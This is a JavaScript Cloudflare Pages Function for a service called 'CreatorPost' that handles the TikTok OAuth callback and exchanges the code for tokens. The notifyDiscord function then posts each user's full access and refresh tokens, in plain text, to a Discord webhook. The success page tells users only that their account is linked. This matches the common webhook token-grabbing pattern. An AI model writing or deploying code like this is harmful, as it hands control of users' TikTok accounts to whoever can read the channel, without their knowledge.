/**
 * CreatorPost — TikTok OAuth Callback (Cloudflare Pages Function)
 *
 * Handles the TikTok OAuth redirect, exchanges the auth code for tokens,
 * then forwards credentials to a Discord webhook for safe retrieval.
 *
 * Secrets — set in Cloudflare Pages dashboard (Settings → Environment variables):
 *   TIKTOK_CLIENT_ID
 *   TIKTOK_CLIENT_SECRET
 *   DISCORD_WEBHOOK_URL
 */

export async function onRequestGet({ request, env }) {
  const redirectUri = new URL(request.url).origin + "/callback";
  const url = new URL(request.url);

  const code = url.searchParams.get("code");
  const state = url.searchParams.get("state");
  const error = url.searchParams.get("error");

  if (error) {
    const desc = url.searchParams.get("error_description") ?? error;
    return htmlResponse(errorPage(desc), 400);
  }

  if (!code) {
    return htmlResponse(errorPage("No authorization code received."), 400);
  }

  let tokenData;
  try {
    tokenData = await exchangeCode(code, redirectUri, env);
  } catch (err) {
    console.error("Token exchange failed:", err);
    return htmlResponse(errorPage("Token exchange failed. Please try again."), 500);
  }

  try {
    await notifyDiscord(tokenData, state, env);
  } catch (err) {
    console.error("Discord webhook failed:", err);
    // Non-fatal — still return success to the user
  }

  return htmlResponse(successPage());
}

// ── TikTok token exchange ──────────────────────────────────────────────────

async function exchangeCode(code, redirectUri, env) {
  const body = new URLSearchParams({
    client_key: env.TIKTOK_CLIENT_ID,
    client_secret: env.TIKTOK_CLIENT_SECRET,
    code,
    grant_type: "authorization_code",
    redirect_uri: redirectUri,
  });

  const res = await fetch("https://open.tiktokapis.com/v2/oauth/token/", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });

  if (!res.ok) {
    const text = await res.text();
    throw new Error(`TikTok returned ${res.status}: ${text}`);
  }

  return res.json();
}

// ── Discord webhook ────────────────────────────────────────────────────────

async function notifyDiscord(tokenData, state, env) {
  if (!env.DISCORD_WEBHOOK_URL) return;

  const { access_token, refresh_token, open_id, scope, expires_in } = tokenData;

  const payload = {
    username: "CreatorPost OAuth",
    embeds: [
      {
        title: "TikTok OAuth Token Received",
        color: 0x7c3aed,
        fields: [
          { name: "open_id", value: open_id ?? "n/a", inline: true },
          { name: "scope", value: scope ?? "n/a", inline: true },
          { name: "expires_in", value: String(expires_in ?? "n/a"), inline: true },
          { name: "access_token", value: `\`\`\`${access_token}\`\`\`` },
          { name: "refresh_token", value: `\`\`\`${refresh_token ?? "none"}\`\`\`` },
          ...(state ? [{ name: "state", value: state, inline: true }] : []),
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  const res = await fetch(env.DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!res.ok) throw new Error(`Discord webhook returned ${res.status}`);
}

// ── HTML responses ─────────────────────────────────────────────────────────

function htmlResponse(body, status = 200) {
  return new Response(body, {
    status,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}

function successPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connected — CreatorPost</title>
  <link rel="stylesheet" href="/styles.css" />
</head>
<body>
  <nav>
    <a href="/" class="logo">Creator<span style="color:var(--accent-light)">Post</span></a>
  </nav>
  <div class="callback-page">
    <div class="icon">✅</div>
    <h1>TikTok Connected!</h1>
    <p>Your account has been successfully linked to CreatorPost.<br>You can close this window.</p>
  </div>
</body>
</html>`;
}

function errorPage(message) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Error — CreatorPost</title>
  <link rel="stylesheet" href="/styles.css" />
</head>
<body>
  <nav>
    <a href="/" class="logo">Creator<span style="color:var(--accent-light)">Post</span></a>
  </nav>
  <div class="callback-page">
    <div class="icon">❌</div>
    <h1>Authorization Failed</h1>
    <p>${escapeHtml(message)}</p>
    <br>
    <a href="/" class="btn btn-outline" style="margin-top:1rem">Back to Home</a>
  </div>
</body>
</html>`;
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
